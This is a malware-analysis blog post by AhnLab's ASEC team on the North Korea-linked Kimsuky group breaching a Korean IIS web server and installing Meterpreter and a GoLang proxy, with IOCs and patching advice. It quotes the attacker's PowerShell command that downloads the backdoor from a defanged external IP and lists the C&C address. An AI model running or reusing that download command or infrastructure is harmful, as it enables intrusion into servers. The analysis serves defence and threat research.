# Reference for threat actor for "Kimsuky, Velvet Chollima"

**Title**: Kimsuky Group Using Meterpreter to Attack Web Servers - ASEC BLOG

**Source**: https://asec.ahnlab.com/en/53046/

## Content


















Kimsuky Group Using Meterpreter to Attack Web Servers - ASEC BLOG





































































 

Malware Information
AhnLab Detection
Statistics
Response Guide
AhnLab
 














Posted By Sanseo  , May 22, 2023 

Kimsuky Group Using Meterpreter to Attack Web Servers 
AhnLab Security Emergency response Center (ASEC) has recently discovered the distribution of malware targeting web servers by Kimsuky group. Kimsuky is a threat group deemed supported by North Korea and has been active since 2013. At first, they attacked North Korea-related research institutes in South Korea before attacking a Korean energy corporation in 2014. Since 2017, their attacks have been targeting countries other than South Korea as well. [1]
ASEC has been providing the analysis of various cases of Kimsuky attacks on the ASEC Blog, mainly spear phishing attacks which involved malicious file attachments to emails in MS Office document files[2],  OneNote [3], or CHM [4]file formats. Kimsuky group usually uses social engineering attacks like the aforementioned spear phishings, but this post will cover the attack cases that targeted web servers. After a successful breach, Kimsuky installed the Metasploit Meterpreter backdoor malware. There have also been identified logs of a proxy malware developed in GoLang being installed.

Attack Cases Targeting IIS Web Servers

The attack target was a Windows IIS web server of a Korean construction company and is thought to have a vulnerability not applied or be inadequately managed. The threat actor breached the IIS web server and executed a Powershell command. The following is a log from AhnLab Smart Defense (ASD) which shows w3wp.exe, a Windows IIS web server process, using Powershell to download an additional payload from outside.

Figure 1. Log of IIS web server process executing a Powershell command
The executed Powershell command is as follows, and the downloaded “img.dat” file is a backdoor malware also known as Metasploit Meterpreter.
> powershell.exe invoke-webrequest -uri “hxxp://45.58.52[.]82/up.dat” -outfile “c:\programdata\img.dat”
Afterward, the threat actor used Meterpreter to install proxy malware additionally. Powershell command was used here as well.
Figure 2. Proxy malware installed by Meterpreter

Meterpreter Malware

Metasploit is a penetration testing framework They are tools that can be used to inspect security vulnerabilities for networks and systems of companies and organizations, providing various features for each penetration test stage. Meterpreter is a backdoor provided by Metasploit and can perform various malicious behaviors by receiving commands from the threat actor.
Because Metasploit is an open-source tool, it is being favored by various threat actors, and this is the same for the Kimsuky group. The ASEC Blog also covered cases of the Kimsuky group using Meterpreter alongside AppleSeed in their attacks. [5] [6]
In addition, aside from the fact that the C&C address used in the attack had been used by the Kimsuky group in the past, the method of having the regsvr32.exe process running the malware is the same as the method used by the Kimsuky group from the past. The malware used in the attacks is in DLL file format and runs after being loaded by the regsvr32.exe process.
Figure 3. Meterpreter running after being loaded by the regsvr32.exe process
What’s different than usual is that the Meterpreter Stager is developed in GoLang. In the past, the Kimsuky group developed their own malware, or packed it with a packer such as VMProtect when distributing the malware. The proxy malware is also developed in GoLang, and the malware will be discussed below. We can assume this as recently distributed malware being developed in GoLang to evade detection.
Figure 4. Meterpreter Stager developed in GoLang
Figure 5. Stager downloading Meterpreter

Proxy (GoLang) Malware

Afterwards, Meterpreter receives a command from the threat actor, executing a Powershell command and installing additional malware. The malware downloaded through the Powershell command is malware that has a proxy feature. Additionally, Kimsuky group has continuously been using proxy malware in their attack processes in the past. [7] A trait unique to this malware would be that it is developed in GoLang, unlike past versions.
Figure 6. GoLang functions of the proxy malware
The proxy malware used in this attack receives 2 IP addresses and port numbers from the command line argument to relay them. A difference between this and past proxy tools is that the string “aPpLe” is used as a signature presumed to be used for a verification process during communications. Considering the fact that the RDP port “127.0.0.1:3389” is used as an example when the malware is executed, it is assumed that the purpose of the threat actor using a proxy malware is for RDP connection to the infected system in later stages.
Figure 7. Proxy malware packet

Conclusion

Kimsuky group’s attack targeting Windows IIS web server has recently been found. Looking at the log, it is presumed that the Kimsuky group attacks web servers that are poorly managed or have vulnerabilities with patches not applied. After a successful breach, Meterpreter was installed in the target systems for the threat actor to gain control over the web server.
Thus, server managers must patch the server so that it is up to date and practice prevention of known vulnerabilities being exploited. Moreover, for externally open servers, protection software must be used to restrict external access. Also, V3 should be updated to the latest version so that malware infection can be prevented.
File Detection
– Backdoor/Win.Meterpreter.C5427507 (2023.05.15.02)
– HackTool/Win.Proxy.C5427508 (2023.05.15.02)
IOC
MD5
– 000130a373ea4085b87b97a0c7000c86: Meterpreter (img.dat)
– 6b2062e61bcb46ce5ff19b329ce31b03: Proxy malware (cl.exe)
Download URLs
– hxxp://45.58.52[.]82/up.dat: Meterpreter
– hxxp://45.58.52[.]82/cl.exe: Proxy malware
C&C URL
– 45.58.52[.]82:8443: Meterpreter
Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.
 


Categories:Malware Information 
Tagged as:Kimsuky,Meterpreter,proxy 




Distribution of Remcos RAT Exploiting sqlps.exe Utility of MS-SQL Servers 

ASEC Weekly Phishing Email Threat Trends (May 7th, 2023 – May 13th, 2023) 







5
1
vote
Article Rating

 





 Subscribe




 Login 




Notify of 


new follow-up comments
new replies to my comments








 







 


Label












{}
[+]

 















Name*





Email





Website






[Important] Consent to Collection and Use of Personal Information


Purpose: Identify the contact information of user who left a comment and respond to inquiries on our blog posts.
Personal Information We Collect: Name of user and organization, Email address
Period of Retention: We store personal information for 3 months. Then, we delete and destroy personal information without delay.

 



I agree to AhnLab’s collection and use of personal information.




















Δ 










 


Label












{}
[+]

 















Name*





Email





Website






[Important] Consent to Collection and Use of Personal Information


Purpose: Identify the contact information of user who left a comment and respond to inquiries on our blog posts.
Personal Information We Collect: Name of user and organization, Email address
Period of Retention: We store personal information for 3 months. Then, we delete and destroy personal information without delay.

 



I agree to AhnLab’s collection and use of personal information.




















Δ 






6 Comments                    









 Inline Feedbacks                    
View all comments











Meterpreter Used by Kimsuky Group to Attack Web Servers – KRSP Digital Agency



    8 months ago













[…] Source: Kimsuky Group Using Meterpreter to Attack Web Servers […]






0






Reply













North Korean Kimsuky Hackers Strike Again with Advanced Reconnaissance Malware - BEKER



    8 months ago













[…] a related development, Kimsuky has also been linked to attacks that weaponize vulnerable Windows Internet Information Services (IIS) servers to drop the […]






0






Reply













North Korean Kimsuky Hackers Strike Again With Advanced Reconnaissance Malware. Hackers News | Hackers News



    8 months ago













[…] a related development, Kimsuky has also been linked to attacks that weaponize vulnerable Windows Internet Information Services (IIS) servers to drop the […]






0






Reply













Kimsuky Threat Group Exploting Chrome Remote Desktop - ASEC BLOG



    7 months ago













[…] malware, but also remote control malware such as Meterpreter to gain control over infected systems. [1] Logs of the group using customized VNC or exploiting remote control tools such as RDP Wrapper also […]






0






Reply













Kimsuky Threat Group Exploting Chrome Remote Desktop - Ciberdefensa



    7 months ago













[…] malware, but also remote control malware such as Meterpreter to gain control over infected systems. [1] Logs of the group using customized VNC or exploiting remote control tools such as RDP Wrapper also […]






0






Reply













BlueShell Used in APT Attacks Against Korean and Thai Targets - ASEC BLOG



    5 months ago













[…] Go to create malware; the Kimsuky threat group developed a downloader that installs Meterpreter, [3] the RedEyes (APT37) threat group developed a backdoor by abusing the Ably service, [4] and the […]






0






Reply




 













Archives Archives

Select Month
 February 2024 
 January 2024 
 December 2023 
 November 2023 
 October 2023 
 September 2023 
 August 2023 
 July 2023 
 June 2023 
 May 2023 
 April 2023 
 March 2023 
 February 2023 
 January 2023 
 December 2022 
 November 2022 
 October 2022 
 September 2022 
 August 2022 
 July 2022 
 June 2022 
 May 2022 
 April 2022 
 March 2022 
 February 2022 
 January 2022 
 December 2021 
 November 2021 
 October 2021 
 September 2021 
 August 2021 
 July 2021 
 June 2021 
 May 2021 
 April 2021 
 March 2021 
 February 2021 
 January 2021 
 December 2020 
 November 2020 
 September 2020 
 August 2020 
 July 2020 
 June 2020 
 May 2020 
 April 2020 
 March 2020 
 February 2020 
 December 2019 
 November 2019 
 October 2019 
 September 2019 
 August 2019 
 June 2019 
 May 2019 
 April 2019 
 March 2019 
 February 2019 
 January 2019 
 November 2018 
 July 2018 
 April 2018 
 February 2018 


FOLLOW US


LinkedIn   


X   


RSS Feed   









footer(en) 220, Pangyoyeok-ro, Bundang-gu, Seongnam-si, Gyeonggi-do, Korea | Privacy & Security© AhnLab, Inc. All rights reserved.family site


한국 (한국어)
Global (English)
日本 (日本語)
 




wpDiscuzInsert 









 




















































































Loading Comments...



 


Write a Comment...




Email



Name



Website














































































































































































































































